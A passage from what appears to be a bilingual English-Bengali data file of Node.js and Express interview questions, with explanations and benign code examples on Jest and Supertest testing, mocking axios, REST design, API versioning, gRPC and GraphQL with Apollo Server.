৩. **জেস্ট অ্যাসারশন**: রেসপন্সের স্ট্যাটাস কোড, বডি মেসেজ ও হেডার সঠিক কিনা তা জেস্টের \`expect()\` মেথড দিয়ে ভ্যালিডেট করা হয়।

### বাস্তব-ভিত্তিক উদাহরণ
কোড ডেপ্লয় করার পূর্বে গিটহাব অ্যাকশনে টেস্ট সুইট চালানো হয়। কোনো ডেভেলপার যদি ভুলবশত সিকিউরড রাউটে অথেনটিকেশন ফেইলর লজিক বদলে ফেলেন, টেস্ট ফেইল হয়ে কোড ডেপ্লয়মেন্ট আটকে যাবে।

### উত্তম অনুশীলন
অ্যাপ লিসেন কোডকে টেস্ট কোড থেকে আলাদা রাখুন। টেস্টে পোর্ট ব্লক হওয়া এড়াতে কখনো লিসেনিং কোড রান করাবেন না। মক রিকোয়েস্ট টেস্টিংয়ে সুপারটেস্টকে সরাসরি অ্যাপ অবজেক্ট পাস করুন।

### সাধারণ ভুলসমূহ
মেইন ফাইল \`app.js\`-এর ভেতরেই \`app.listen(3000)\` কল করে রাখা এবং সেটি টেস্ট ফাইল ইম্পোর্ট করা। এর ফলে প্যারালালি টেস্ট রান হওয়ার সময় \`EADDRINUSE: port already in use\` এরর আসবে।

### Code Example
\`\`\`javascript
// ১. ডেভলপমেন্ট ফাইল: app.js
const express = require('express');
const app = express();

app.get('/api/welcome', (req, res) => {
  res.status(200).json({ message: 'Welcome to DevPrep!' });
});

module.exports = app; // শুধু অ্যাপ অবজেক্টটি এক্সপোর্ট করা হলো

// ২. টেস্ট ফাইল: app.test.js (জেস্ট দ্বারা চালিত হবে)
const request = require('supertest');
const testApp = require('./app'); 

describe('GET /api/welcome', () => {
  it('সঠিকভাবে ২০০ স্ট্যাটাস কোড এবং ওয়েলকাম মেসেজ দিবে', async () => {
    const res = await request(testApp).get('/api/welcome');
    
    expect(res.statusCode).toEqual(200);
    expect(res.body).toHaveProperty('message');
    expect(res.body.message).toBe('Welcome to DevPrep!');
  });
});
\`\`\``
  },
  {
    id: 'node-express-55',
    title: 'How do you mock external API calls and database operations in Node.js integration tests?',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Testing', 'Jest', 'Mocking', 'Integration Tests'],
    enAnswer: 'To mock operations, intercept the database client or HTTP client library. In Jest, use jest.mock() to override module imports (like pg, mongoose, or axios) and provide mock return values, ensuring tests remain isolated and fast without calling real external services.',
    bnAnswer: 'টেস্টে মক (mock) করতে ডাটাবেস ক্লায়েন্ট বা এইচটিটিপি ক্লায়েন্ট ইন্টারসেপ্ট করা হয়। জেস্ট-এ jest.mock() ব্যবহার করে মডিউল ইম্পোর্টগুলো (যেমন pg, mongoose বা axios) ওভাররাইড করে ডামি রিটার্ন ভ্যালু সেট করা হয় যাতে নেটওয়ার্ক রিকোয়েস্ট ছাড়াই দ্রুত টেস্ট সম্পন্ন হয়।',
    enExplanation: `### Explanation
When running integration tests, calling real databases or third-party APIs (like Stripe or SendGrid) is undesirable:
1. **Network dependency**: External services can be down, causing tests to fail randomly.
2. **Cost**: Running tests shouldn't hit paid APIs.
3. **Speed**: Network calls slow down test suites.
4. **Jest Mocking**:
   - Use \`jest.mock('axios')\` to override the HTTP client.
   - Use \`mockResolvedValue()\` or \`mockRejectedValue()\` to simulate successful API responses or failure states.

### Real-World Example
Testing a checkout route that processes payments via Stripe: Instead of calling the real Stripe API, mock the Stripe module. Set it to resolve successfully when tested with a valid credit card schema, and fail when simulating a declined transaction.

### Best Practice
Verify that your mock returns align with the exact signature of the real library. When testing databases, use in-memory alternatives (like \`mongodb-memory-server\`) or mock database service queries using Jest SpyOn functions.

### Common Mistakes
Forgetting to reset mock states between test specs. If you do not call \`jest.clearAllMocks()\` or \`jest.resetMocks()\`, mock counters and return values will leak into subsequent tests, causing unexpected failures.

### Code Example
\`\`\`javascript
// Target Service: weatherService.js
const axios = require('axios');
async function fetchTemp() {
  const res = await axios.get('https://api.weather.com/today');
  return res.data.temp;
}

// Test Script: weather.test.js (Mocking Axios)
const axios = require('axios');
const { fetchTemp } = require('./weatherService');

// 1. Tell Jest to mock the entire axios module
jest.mock('axios');

describe('fetchTemp', () => {
  it('should return mocked temperature values', async () => {
    // 2. Define the mock return behavior
    axios.get.mockResolvedValue({ data: { temp: 32 } });

    const temp = await fetchTemp();
    expect(temp).toBe(32);
    expect(axios.get).toHaveBeenCalledWith('https://api.weather.com/today');
  });
});
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
টেস্ট সুইট রান করার সময় আসল ডাটাবেস বা থার্ড-পার্টি সার্ভিস (যেমন: Stripe পেমেন্ট, SendGrid ইমেইল) সরাসরি কল করা অনুচিত:
১. **ডিপেন্ডেন্সি**: আসল এপিআই ডাউন থাকলে টেস্ট ফেইল হবে।
২. **সার্ভিস চার্জ**: এপিআই চার্জ বা ডাটাবেস কস্ট বাঁচানো।
৩. **গতি**: রিয়েল নেটওয়ার্ক কল টেস্ট সুইটের গতি কমিয়ে দেয়।
৪. **জেস্ট মকিং মেথড**:
   - \`jest.mock('axios')\` দিয়ে এক্সিওস লাইব্রেরিকে ওভাররাইড করা।
   - \`mockResolvedValue()\` ব্যবহার করে সফল ডাটা এবং \`mockRejectedValue()\` দিয়ে এরর সিনারিও চেক করা।

### বাস্তব-ভিত্তিক উদাহরণ
ইউজার পেমেন্ট করার গেটওয়ে টেস্ট: স্টাইপ এপিআই কল করার পরিবর্তে আমরা স্ট্রাইপ মডিউলকে মক করে নিই। আমরা মেথডটি সেট করে দিই যাতে ডামি কার্ড আইডি পাস করলে এটি পেমেন্ট সাকসেসফুল রেসপন্স রিটার্ন করে।

### উত্তম অনুশীলন
মকের ডাটা ফরম্যাট ও অবজেক্ট স্ট্রাকচার যেন আসল লাইব্রেরির সাথে সামঞ্জস্যপূর্ণ হয় তা নিশ্চিত করুন। ডাটাবেস টেস্টিংয়ের জন্য ইন-মেমোরি ডাটাবেস (যেমন: \`mongodb-memory-server\`) ব্যবহার করা সেরা সমাধান।

### সাধারণ ভুলসমূহ
প্রতিটি টেস্টের মাঝে মক স্টেট ক্লিন বা রি-সেট না করা। \`jest.clearAllMocks()\` কল না করলে পূর্বের টেস্টের রিকোয়েস্ট কাউন্টার পরের টেস্টের ফলাফলে ব্যাঘাত ঘটায়।

### Code Example
\`\`\`javascript
// মেইন কোড: weatherService.js
const axios = require('axios');
async function fetchTemp() {
  const res = await axios.get('https://api.weather.com/today');
  return res.data.temp;
}

// টেস্ট কোড: weather.test.js (Axios মক করা)
const axios = require('axios');
const { fetchTemp } = require('./weatherService');

// ১. জেস্টকে এক্সিওস মডিউল মক করার নির্দেশ দেওয়া
jest.mock('axios');

describe('fetchTemp', () => {
  it('মক করা ওয়েদার ডাটা রিটার্ন করবে', async () => {
    // ২. মক রিটার্ন ভ্যালু সেট করা
    axios.get.mockResolvedValue({ data: { temp: 32 } });

    const temp = await fetchTemp();
    expect(temp).toBe(32);
    expect(axios.get).toHaveBeenCalledWith('https://api.weather.com/today');
  });
});
\`\`\``
  },
  {
    id: 'node-express-56',
    title: 'Explain REST API design best practices in Express.js.',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Express.js', 'REST API', 'API Design', 'Architecture'],
    enAnswer: 'REST API best practices include using nouns for resource URIs, representing hierarchy via nested paths, using correct HTTP methods (GET/POST/PUT/DELETE), returning standard HTTP status codes, and structuring responses consistently in JSON format.',
    bnAnswer: 'REST API-র সেরা অনুশীলনের মধ্যে রয়েছে ইউআরএল পাথে নাউন বা বিশেষ্য ব্যবহার করা, নেস্টেড পাথের মাধ্যমে হাইরার্কি প্রকাশ করা, সঠিক HTTP মেথড ব্যবহার করা, স্ট্যান্ডার্ড স্ট্যাটাস কোড প্রদান করা এবং জেএসন ফরম্যাটে রেসপন্স পাঠানো।',
    enExplanation: `### Explanation
REST (Representational State Transfer) defines stateless architecture principles:
1. **Nouns, not verbs for endpoints**: Use \`GET /api/products\` instead of \`GET /api/getProducts\`.
2. **Standard HTTP Methods**:
   - \`GET\`: Retrieve resources.
   - \`POST\`: Create resources.
   - \`PUT\` / \`PATCH\`: Modify resources.
   - \`DELETE\`: Remove resources.
3. **Plural Resource Naming**: Keep route names pluralized consistently: \`/users\`, \`/posts\`.
4. **Hierarchical Relationships**: Represent sub-resources clearly: \`GET /api/users/:userId/posts\` (fetches posts belonging to a specific user).
5. **Filtering and Sorting**: Do not hardcode filters. Use query parameters: \`/api/products?sort=price&limit=10\`.

### Real-World Example
Bad API endpoint design:
\`\`\`
POST /api/createUser
GET /api/viewUserDetail/5
\`\`\`
Good REST API design:
\`\`\`
POST /api/users
GET /api/users/5
\`\`\`

### Best Practice
Set standard API headers: ensure \`Content-Type: application/json\` is sent on all endpoints. Wrap API routes in a versioned prefix (e.g., \`/api/v1/...\`) to allow upgrading the API structure in the future without breaking existing clients.

### Common Mistakes
Using \`POST\` methods for search queries or \`GET\` methods for deleting documents, which violates HTTP method standards and affects caching engines.

### Code Example
\`\`\`javascript
const express = require('express');
const app = express();

// RESTful Route Design Example
app.use(express.json());

// GET all products (Supports sorting query)
app.get('/api/v1/products', (req, res) => {
  const sortBy = req.query.sort || 'name';
  res.json({ message: \`Fetched products sorted by \${sortBy}\` });
});

// POST to create a product
app.post('/api/v1/products', (req, res) => {
  const { name, price } = req.body;
  res.status(201).json({ created: true, name });
});

const server = app.listen(3000, () => server.close());
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
REST (Representational State Transfer) এপিআই ডিজাইনের মূলনীতিসমূহ:
১. **নাউন বা বিশেষ্য ব্যবহার**: ক্রিয়াপদ বাদ দিয়ে নাউন ব্যবহার করা। যেমন: \`/api/getProducts\` এর বদলে \`/api/products\`।
২. **সঠিক মেথড নির্ধারণ**:
   - \`GET\`: রিসোর্স রিড বা সার্চ করার জন্য।
   - \`POST\`: নতুন রিসোর্স তৈরি বা ইনপুট করার জন্য।
   - \`PUT\` / \`PATCH\`: পূর্বের রিসোর্স এডিট বা আপডেট করার জন্য।
   - \`DELETE\`: রিসোর্স মুছে ফেলার জন্য।
৩. **বহুবচন নাম (Plural)**: ইউআরএল পাথের নামগুলো প্লুরাল বা বহুবচন রাখা: \`/users\`, \`/orders\`।
৪. **হায়ারার্কি বা সম্পর্ক প্রকাশ**: নেস্টেড পাথ দিয়ে সম্পর্ক প্রকাশ করা: \`GET /api/users/:userId/posts\` (নির্দিষ্ট ইউজারের সব পোস্ট)।
৫. **কোয়েরি ফিল্টারিং**: সর্টিং বা ফিল্টারিংয়ে কোয়েরি প্যারামিটার ব্যবহার করা: \`/api/products?sort=price\`।

### বাস্তব-ভিত্তিক উদাহরণ
ভুল এপিআই পাথ:
\`\`\`
POST /api/createUser
GET /api/viewUserDetail/5
\`\`\`
সঠিক REST এপিআই পাথ:
\`\`\`
POST /api/users
GET /api/users/5
\`\`\`

### উত্তম অনুশীলন
ফিউচার আপডেট ও ব্যাকওয়ার্ড কম্প্যাটিবিলিটির জন্য এপিআই রাউটে ভার্সন কন্ট্রোল প্রিপিক্স ব্যবহার করুন (যেমন: \`/api/v1/products\`)। রেসপন্সে সঠিক হেডার ও মেসেজ স্ট্রাকচার বজায় রাখুন।

### সাধারণ ভুলসমূহ
ডাটা ডিলিট করার জন্য \`GET\` মেথড ব্যবহার করা (যেমন: \`/api/deleteUser?id=5\`), যা এইচটিটিপি প্রটোকল বিরোধী এবং সার্চ ইঞ্জিনের ক্রলারের কারণে অনাকাঙ্ক্ষিত ডিলিট ট্রিগার করতে পারে।

### Code Example
\`\`\`javascript
const express = require('express');
const app = express();

app.use(express.json());

// গেট অল প্রোডাক্টস (সর্টিং কোয়েরি সহ)
app.get('/api/v1/products', (req, res) => {
  const sortBy = req.query.sort || 'name';
  res.json({ message: \`সর্ট করা প্রোডাক্ট লিস্ট: \${sortBy}\` });
});

// নতুন প্রোডাক্ট তৈরি
app.post('/api/v1/products', (req, res) => {
  const { name, price } = req.body;
  res.status(201).json({ created: true, name });
});

const server = app.listen(3000, () => server.close());
\`\`\``
  },
  {
    id: 'node-express-57',
    title: 'Explain API Versioning strategies in Node.js applications.',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['API Design', 'Versioning', 'Express.js', 'Best Practice'],
    enAnswer: 'API Versioning allows developers to release breaking changes without breaking older client integrations. The three main strategies are: URL Path versioning (e.g. /api/v1/users), Query Parameter versioning (e.g. /users?version=1), and Header versioning (e.g. Accept-Version: 1.0.0).',
    bnAnswer: 'এপিআই ভার্সনিং ডেভেলপারদের ব্যাকএন্ডে ব্রেকিং চেঞ্জ রিলিজ করার সুযোগ দেয় পূর্বের ক্লায়েন্ট কানেকশন ক্ষতিগ্রস্ত না করে। এর ৩টি মূল কৌশল হলো: URL পাথ ভার্সনিং (যেমন: /api/v1/users), কোয়েরি প্যারামিটার ভার্সনিং এবং হেডার ভার্সনিং (যেমন: Accept-Version: 1.0.0)।',
    enExplanation: `### Explanation
Strategies to version APIs in Express:
1. **URI/Path Versioning (Most Popular)**:
   - Version prefix is hardcoded in URL: \`/api/v1/users\`.
   - Very transparent, easy to route, and can be cached easily.
   - Handled in Express by mounting different routers to versioned path prefixes:
     \`\`\`javascript
     app.use('/api/v1', v1Router);
     app.use('/api/v2', v2Router);
     \`\`\`
2. **Query Parameter Versioning**:
   - Version is sent as a query parameter: \`/users?v=2\`.
   - Requires custom controller routing switches.
3. **Accept Header Versioning**:
   - Client sends custom headers (e.g., \`Accept: application/vnd.company.v1+json\`).
   - Keeps URLs clean, but is harder to test and prevents simple CDN caching.

### Real-World Example
A mobile app is published to the App Store using API Version v1. Months later, you refactor the user profile database schema, breaking the v1 schema. By publishing the new structure under v2, the mobile app continues working using v1, while web developers transition to v2.

### Best Practice
Adopt URI/Path Versioning (\`/api/v1\`) for standard public web APIs. It is highly readable and works natively with web proxies, load balancers, and CDN caching rules.

### Common Mistakes
Releasing database schema modifications directly to active production endpoints without updating version namespaces, instantly crashing older client installations.

### Code Example
\`\`\`javascript
const express = require('express');
const app = express();

// V1 Router setup
const v1Router = express.Router();
v1Router.get('/status', (req, res) => {
  res.json({ version: 'v1.0.0', deprecationDate: '2026-12-31' });
});

// V2 Router setup
const v2Router = express.Router();
v2Router.get('/status', (req, res) => {
  res.json({ version: 'v2.0.0', status: 'active' });
});

// Mount routers to versioned paths
app.use('/api/v1', v1Router);
app.use('/api/v2', v2Router);

const server = app.listen(3000, () => server.close());
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
এক্সপ্রেসজেএস-এ এপিআই ভার্সনিং করার বিভিন্ন কৌশলসমূহ:
১. **ইউআরআই/পাথ ভার্সনিং (URI Path Versioning - জনপ্রিয়)**:
   - সরাসরি ইউআরএল পাথে ভার্সন প্রিপিক্স যুক্ত করা: \`/api/v1/users\`।
   - এটি পড়তে সহজ, রাউটিং ক্লিয়ার থাকে এবং প্রক্সি ক্যাশিংয়ের সুবিধা দেয়।
   - এক্সপ্রেসে এটি রাউটার মাউন্টিংয়ের মাধ্যমে করা হয়:
     \`\`\`javascript
     app.use('/api/v1', v1Router);
     app.use('/api/v2', v2Router);
     \`\`\`
২. **কোয়েরি প্যারামিটার ভার্সনিং**:
   - কোয়েরি আকারে ভার্সন পাস করা: \`/users?v=2\`।
৩. **হেডার ভার্সনিং (Header Versioning)**:
   - কাস্টম এইচটিটিপি হেডার পাঠিয়ে ভার্সন চেনা (যেমন: \`Accept-Version: 1.0.0\`)।

### বাস্তব-ভিত্তিক উদাহরণ
মোবাইল অ্যাপ ব্যবহারকারীরা অ্যাপ স্টোর থেকে অ্যাপের v1 ভার্সন ডাউনলোড করে ব্যবহার করছেন। পরবর্তীতে ডাটাবেস স্ট্রাকচার এডিট করা হলো যা v1 এর সাথে ম্যাচ করে না। নতুন কোড v2 এন্ডপয়েন্টে ডেপ্লয় করলে পুরোনো ইউজাররা v1 রাউটে কোনো ক্র্যাশ ছাড়াই অ্যাপ চালাতে পারবেন।

### উত্তম অনুশীলন
পাবলিক এপিআইর জন্য পাথ ভার্সনিং (\`/api/v1\`) ব্যবহার করুন। এটি সহজে ক্যাশ করা যায় এবং ক্লায়েন্ট ডেভেলপারদের জন্য ডকুমেন্টেশন রিড করা সহজ হয়।

### সাধারণ ভুলসমূহ
ভার্সন নেমস্পেস বা ইউআরএল পাথ চেঞ্জ না করে সরাসরি লাইভ সার্ভারের এপিআই বডি ডাটার ফরম্যাট চেঞ্জ করে ফেলা, যা সাথে সাথেই আগের ক্লায়েন্ট সার্ভিসগুলোকে ডাউন করে দেয়।

### Code Example
\`\`\`javascript
const express = require('express');
const app = express();

// V1 রাউটার সেটআপ
const v1Router = express.Router();
v1Router.get('/status', (req, res) => {
  res.json({ version: 'v1.0.0', status: 'deprecated' });
});

// V2 রাউটার সেটআপ
const v2Router = express.Router();
v2Router.get('/status', (req, res) => {
  res.json({ version: 'v2.0.0', status: 'active' });
});

// ভার্সন অনুযায়ী রাউটার মাউন্ট করা
app.use('/api/v1', v1Router);
app.use('/api/v2', v2Router);

const server = app.listen(3000, () => server.close());
\`\`\``
  },
  {
    id: 'node-express-58',
    title: 'What is gRPC and how does it compare to REST/HTTP APIs?',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Node.js', 'gRPC', 'API Design', 'Protobuf'],
    enAnswer: 'gRPC is a high-performance, open-source Remote Procedure Call (RPC) framework developed by Google. Unlike REST which uses JSON over HTTP/1.1, gRPC uses Protocol Buffers (binary data serialization) over HTTP/2, resulting in much faster execution and reduced bandwidth footprint.',
    bnAnswer: 'gRPC হলো গুগলের তৈরি একটি হাই-পারফরম্যান্স, ওপেন-সোর্স রিমোট প্রসিডিউর কল (RPC) ফ্রেমওয়ার্ক। সাধারণ REST এপিআইতে যেখানে HTTP/1.1 এর ওপর JSON টেক্সট পাঠানো হয়, সেখানে gRPC মূলত HTTP/2 এর ওপর প্রোটোকল বাফার (বাইনারি ডাটা) ব্যবহার করে ব্যান্ডউইডথ সাশ্রয় ও দ্রুত গতি নিশ্চিত করে।',
    enExplanation: `### Explanation
Key differences between gRPC and REST:
1. **Serialization Format**: REST transmits JSON (human-readable string text). gRPC serializes data into Protocol Buffers (Protobuf), compiling payloads into highly compact binary formats.
2. **Network Protocol**: REST uses HTTP/1.1 (creates a new TCP handshake for concurrent requests unless kept alive). gRPC uses HTTP/2 (enabling multiplexing, letting clients send multiple requests simultaneously over a single TCP connection).
3. **API Definition**: REST relies on Swagger/OpenAPI schemas. gRPC strictly requires compiling a contract interface using \`.proto\` files defining types, services, and procedure calls.
4. **Streaming**: REST streaming is limited. gRPC natively supports bidirectional streaming (client and server can stream data simultaneously).

### Real-World Example
In a high-scale microservices architecture (e.g. 50 internal Node.js services communicating thousands of times per second), using gRPC instead of REST reduces serialization CPU overhead and bandwidth cost by up to 60-80%.

### Best Practice
Use gRPC for internal service-to-service communication (East-West traffic) inside your backend cloud container network. Stick to REST/HTTP or GraphQL for external front-facing client communication (North-South traffic), as browsers do not natively support full gRPC configurations easily.

### Common Mistakes
Choosing gRPC for simple public mobile web apps where client-side JavaScript must access the endpoints directly, adding complex proxy layers (like gRPC-Web) unnecessarily.

### Code Example
\`\`\`protobuf
// Sample Protobuf schema definition (user.proto)
syntax = "proto3";

package user;

service UserService {
  rpc GetUserProfile (UserRequest) returns (UserResponse);
}

message UserRequest {
  string userId = 1;
}

message UserResponse {
  string name = 1;
  string email = 2;
}
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
gRPC এবং REST এপিআই-এর মধ্যকার তুলনা:
১. **ডাটা ফরম্যাট**: REST এপিআই টেক্সটভিত্তিক JSON ডাটা পাঠায়। gRPC ডাটাকে প্রোটোকল বাফারে (Protobuf) রূপান্তর করে অতি ক্ষুদ্র বাইনারি ফরম্যাটে সেন্ড করে।
২. **নেটওয়ার্ক প্রটোকল**: REST মূলত HTTP/1.1 ব্যবহার করে যেখানে প্রতি রিকোয়েস্টে সকেট ওপেন করার প্রয়োজন হতে পারে। gRPC মূলত HTTP/2 ব্যবহার করে যেখানে একটি সংযোগের ওপর দিয়ে একই সময়ে মাল্টিপ্লেক্সিং পদ্ধতিতে শত শত ডাটা পাঠানো যায়।
৩. **ইন্টারফেস চুক্তি**: REST-এ টাইপ চেকিং ঐচ্ছিক। gRPC-তে অবশ্যই \`.proto\` ফাইলে ক্লায়েন্ট-সার্ভার আর্গুমেন্ট রুলস ডিফাইন করে ইন্টারফেস কম্পাইল করে নিতে হয়।

### বাস্তব-ভিত্তিক উদাহরণ
হাজার হাজার ইন্টারনাল মাইক্রোসার্ভিস একে অপরের সাথে কানেক্ট করার সময় (যেমন সার্ভিস A থেকে সার্ভিস B তে ডাটা পাঠানো) gRPC ব্যবহার করলে ডেটা ট্রান্সফার ও প্রসেসিং স্পিড প্রায় ৮০% পর্যন্ত বৃদ্ধি পায়।

### উত্তম অনুশীলন
ব্যাকএন্ডের অভ্যন্তরীণ সার্ভিস-টু-সার্ভিস যোগাযোগের জন্য gRPC ব্যবহার করুন। আর বাইরের ক্লায়েন্ট ব্রাউজারের যোগাযোগের জন্য REST বা GraphQL ব্যবহার করুন, কারণ ব্রাউজারে সরাসরি নেটিভ gRPC সাপোর্ট পাওয়া কঠিন।

### সাধারণ ভুলসমূহ
ছোট ও সাধারণ পাবলিক ওয়েবসাইটের জন্য gRPC বেছে নেওয়া, যার ফলে ফ্রন্টএন্ড কোডে এটি লোড করতে বাড়তি প্রক্সি গেটওয়ে (যেমন: gRPC-Web) কনফিগার করতে হয় যা ডেভেলপমেন্ট জটিল করে তোলে।

### Code Example
\`\`\`protobuf
// একটি ডামি প্রোটোফাইল স্কিমা (user.proto)
syntax = "proto3";

package user;

service UserService {
  rpc GetUserProfile (UserRequest) returns (UserResponse);
}

message UserRequest {
  string userId = 1;
}

message UserResponse {
  string name = 1;
  string email = 2;
}
\`\`\``
  },
  {
    id: 'node-express-59',
    title: 'Explain GraphQL server setup in Express.js using Apollo Server.',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['Express.js', 'GraphQL', 'Apollo Server', 'API Design'],
    enAnswer: 'To set up a GraphQL server in Express, define a GraphQL schema (type definitions) and resolvers (functions that fetch data). Use ApolloServer and integrate it as middleware using expressMiddleware from @apollo/server/express4.',
    bnAnswer: 'এক্সপ্রেসে GraphQL সার্ভার সেটআপ করতে টাইপ ডেফিনিশন (Schema) এবং রিজলভার (Resolvers) নির্ধারণ করতে হয়। এরপর ApolloServer ইনিশিয়ালাইজ করে @apollo/server/express4 এর expressMiddleware মিডলওয়্যার দিয়ে এক্সপ্রেসে মাউন্ট করা হয়।',
    enExplanation: `### Explanation
GraphQL offers query flexibility:
1. **Schema (TypeDefs)**: Defines the API blueprint using GraphQL Schema Definition Language (SDL). Lists queries, mutations, and object types.
2. **Resolvers**: Functions that resolve queries. They map directly to schema keys and fetch data from databases or APIs.
3. **Integration**: Apollo Server compiles this schema and provides a middleware controller.
   - Unlike REST, GraphQL operates on a **single endpoint** (usually \`/graphql\`) and executes requests using POST methods containing query string scopes.

### Real-World Example
Instead of hitting \`/users\`, \`/posts\`, and \`/comments\` in three separate REST API calls to render a dashboard, a GraphQL client fetches all combined fields using a single query payload.

### Best Practice
Define schema modularly. Use resolvers efficiently, watching out for the "N+1 query problem" (use loaders like \`dataloader\` to batch and cache database requests inside resolvers).

### Common Mistakes
Putting database business logic directly inside resolvers. Keep resolvers thin; let them delegate data fetching tasks to service classes or models.

### Code Example
\`\`\`javascript
// Conceptual GraphQL Setup using Apollo Server format
const { ApolloServer } = require('@apollo/server');

// 1. Schema Definition
const typeDefs = \`
  type Query {
    hello: String
  }
\`;

// 2. Resolver Definition
const resolvers = {
  Query: {
    hello: () => 'Hello from GraphQL DevPrep!'
  }
};

const server = new ApolloServer({ typeDefs, resolvers });
console.log("GraphQL server schema configured.");
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
GraphQL ক্লায়েন্টকে নিজের পছন্দমতো ডাটা ফিল্ড চেয়ে নেওয়ার ফ্লেক্সিবিলিটি দেয়:
১. **স্কিমা (TypeDefs)**: এটি ডাটার ব্লু-প্রিন্ট বা রূপরেখা তৈরি করে। এখানে কুয়েরি, মিউটেশন ও অবজেক্ট স্ট্রাকচার ডিফাইন করা হয়।
২. **রিজলভার (Resolvers)**: এটি কুয়েরির ডেটাবেস লজিক হ্যান্ডেল করে। স্কিমার প্রতিটি ফিল্ডের জন্য আলাদা ডাটা কোয়েরি করে ডাটা রিটার্ন করে।
৩. **ইন্টিগ্রেশন**: অ্যাপোলো সার্ভার এটি কম্পাইল করে এক্সপ্রেসের একটি মিডলওয়্যার হিসেবে এন্ট্রি দেয়।
   - এটি কেবল একটি এন্ডপয়েন্টে (\`/graphql\`) কাজ করে এবং বডিতে রিকোয়েস্ট চেইন পাঠিয়ে ডাটা নেয়।

### বাস্তব-ভিত্তিক উদাহরণ
ড্যাশবোর্ডে ইউজারের নাম, তার করা পোস্ট ও কমেন্ট রেন্ডার করতে হবে: REST এপিআই তে ৩টি ইউআরএল হিট করতে হবে। GraphQL এ সিঙ্গেল কোয়েরি কুয়েরি বডিতে লিখে একটি হিটের মাধ্যমে সব ডাটা একসাথে আনা যাবে।

### উত্তম অনুশীলন
রিজলভারগুলোকে ছোট রাখুন। রিজলভারের ভেতর সরাসরি বড় ডাটাবেস লজিক না লিখে ডেডিকেটেড সার্ভিস ফাংশনে কল পাঠান। এন+১ (N+1) কোয়েরি এরর এড়াতে \`dataloader\` মডিউল ব্যবহার করুন।

### সাধারণ ভুলসমূহ
ভুল ফিল্ড রিকোয়েস্ট মনিটর না করে রিজলভারের ভেতর লুপ চালানো, যার ফলে একই ডাটাবেস কুয়েরি প্রতিবার চাইল্ড ডাটার জন্য বারবার রান হয়ে সার্ভার ধীর করে দেয়।

### Code Example
\`\`\`javascript
// অ্যাপোলো সার্ভার দিয়ে গ্রাফকিউএল স্কিমা তৈরির নমুনা
const { ApolloServer } = require('@apollo/server');

// ১. স্কিমা বা টাইপ ডেফিনিশন
const typeDefs = \`
  type Query {
    hello: String
  }
\`;

// ২. রিজলভার ফাংশন
const resolvers = {
  Query: {
    hello: () => 'হ্যালো গ্রাফকিউএল সার্ভার!'
  }
};

const server = new ApolloServer({ typeDefs, resolvers });
console.log("গ্রাফকিউএল স্কিমা কনফিগার সম্পন্ন।");
\`\`\``
  },
  {
    id: 'node-express-60',
    title: 'Explain the difference between GraphQL Queries and Mutations with code examples.',
    difficulty: 'intermediate',
    category: 'node-express',
    tags: ['GraphQL', 'Apollo Server', 'API Design', 'Express.js'],
    enAnswer: 'GraphQL Queries are read-only operations used to fetch data from the server, similar to HTTP GET. GraphQL Mutations are write operations used to create, update, or delete data on the server, similar to HTTP POST/PUT/DELETE.',
    bnAnswer: 'GraphQL কুয়েরি (Queries) হলো রিড-অনলি অপারেশন যা সার্ভার থেকে ডাটা রিড বা সার্চ করতে ব্যবহৃত হয় (HTTP GET এর সমতুল্য)। GraphQL মিউটেশন (Mutations) হলো রাইট অপারেশন যা সার্ভারের ডাটা ক্রিয়েট, আপডেট বা ডিলিট করতে ব্যবহৃত হয় (HTTP POST/PUT/DELETE এর সমতুল্য)।',
    enExplanation: `### Explanation
How operations are segregated in GraphQL:
1. **Query**:
   - Used for retrieval.
   - Safe to run repeatedly (idempotent, does not alter state).
   - Example: Fetching user profiles or catalog lists.
2. **Mutation**:
   - Used for state changes.
   - Can modify databases, send verification emails, or update sessions.
   - Returns the modified object data structure in response immediately, allowing frontend caches to update instantly.

### Real-World Example
- Reading blog post titles: Query \`posts { title }\`.
- Creating a new blog post: Mutation \`createPost(title: "Node JS") { id title }\` which inserts a database record and returns the new post ID.

### Best Practice
Always return the modified object details in the mutation response. This allows client-side caching libraries (like Apollo Client or Relay) to update the local UI cache immediately without refetching the query.

### Common Mistakes
Using Queries to update state or perform writes (like deleting a user inside a \`getUser\` query resolver), which violates design specifications and creates tracking bugs.

### Code Example
\`\`\`javascript
// GraphQL Schema Definition for both Queries and Mutations
const typeDefs = \`
  type User {
    id: ID!
    name: String!
  }

  type Query {
    getUser(id: ID!): User
  }

  type Mutation {
    createUser(name: String!): User!
  }
\`;

// Resolver mappings
const users = [];
const resolvers = {
  Query: {
    getUser: (_, { id }) => users.find(u => u.id === id)
  },
  Mutation: {
    createUser: (_, { name }) => {
      const newUser = { id: String(users.length + 1), name };
      users.push(newUser);
      return newUser;
    }
  }
};
\`\`\``,
    bnExplanation: `### ব্যাখ্যা
GraphQL-এ ডাটা প্রসেস অপারেশনের শ্রেণীবিভাগ:
১. **কুয়েরি (Query)**:
   - শুধু ডেটা পড়ার জন্য ব্যবহৃত হয়।
   - এটি সার্ভার স্টেটে কোনো পরিবর্তন করে না।
   - উদাহরণ: প্রোডাক্ট তালিকা বা ব্লগ রিড করা।
২. **মিউটেশন (Mutation)**:
   - ডাটাবেস রাইট বা পরিবর্তন করার জন্য ব্যবহৃত হয়।
   - ডাটাবেসে নতুন এন্ট্রি করা, ডাটা এডিট করা বা ডিলিট করার কাজ সম্পন্ন করে।
   - সাধারণত রেসপন্সে চেঞ্জ হওয়া অবজেক্টের নতুন রূপটি রিটার্ন করে যাতে ফ্রন্টএন্ড সহজে আপডেট হয়ে যায়।

### বাস্তব-ভিত্তিক উদাহরণ
- ব্লগ পোস্টের টাইটেল দেখা: Query \`posts { title }\`।
- নতুন ব্লগ পোস্ট সেভ করা: Mutation \`createPost(title: "Node JS") { id title }\` যা ডাটাবেসে ডাটা রাইট করে নতুন আইডি রিটার্ন করে।

### উত্তম অনুশীলন
